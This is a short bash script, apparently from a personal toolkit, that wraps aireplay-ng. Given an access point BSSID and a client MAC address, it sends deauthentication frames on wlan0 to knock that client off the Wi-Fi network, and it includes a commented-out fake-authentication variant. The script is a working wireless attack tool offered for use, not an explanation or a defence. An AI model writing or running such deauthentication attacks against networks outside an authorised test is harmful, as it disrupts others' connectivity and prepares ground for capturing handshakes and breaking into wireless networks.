#!/bin/bash

source /root/Desktop/programs/help_menu.sh

#this is to pass in the mac address and the adapter mac address

#help menu
if [ $# -eq 1 ] && [ $1 == "-h" ]
then
	help_menu 'air [bssid] [station]\nexample:air 11:22:33:44:55:66 11:22:33:44:55:66\nwill always use wlan0'
	#help_menu './airgo 11:22:33:44:55:66 WI:FI:AD:DR:ES:S0'
	exit 0
fi

if [ $# -eq 2 ]
then
	aireplay-ng --deauth 4 -a $1 -c $2 wlan0
fi
#aireplay-ng --fakeauth 30 -a $1 -h $2 wlan0


